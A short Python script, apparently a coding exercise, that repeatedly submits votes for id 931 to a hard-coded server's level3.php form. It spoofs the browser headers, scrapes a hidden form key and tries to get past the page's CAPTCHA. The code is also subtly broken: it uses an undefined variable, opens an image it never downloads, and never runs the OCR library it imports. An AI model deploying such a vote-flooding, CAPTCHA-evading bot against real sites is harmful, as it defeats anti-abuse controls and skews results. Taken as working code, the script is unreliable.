#!/usr/bin/python3

import requests
import pytesseract
from bs4 import BeautifulSoup
import os

try:
    from PIL import Image
except ImportError:
    import Image


imgip = "http://158.69.76.135"
php = "http://158.69.76.135/level3.php"
user_agent = ("Mozilla/5.0 (Windows NT 10.0; WOW64) \
AppelWebKit/537.36 (HTML like Gecko) Chrome/77.0.3865.90 Safari/537.36")

header = {
    "user-agent": user_agent,
    "referer": php
}
vote = {

    "id": "931",
    "holdthedoor": "submit",
    "key": "",
    "captcha": ""
}

if __name__ == "__main__":
    for i in range (0, 1024):
        s = requests.session()
        p = s.get(php, headers=header)
        soup = BeautifulSoup(p.text, "html.parser")
        hv = soup.find("form", {"method": "post"})
        hv = hv.find("input",{"type": "hidden"})
        vote["key"] = hv["value"]

        cap = soup.find("form", {"method": "post"}).find("img")
        cap = imgip + cp["src"]
        imgcap = open("captcha.png")
        os.remove("captcha.png")
        vote["captcha"] = imgcap

        s.post(php, headers=header, data=vote)
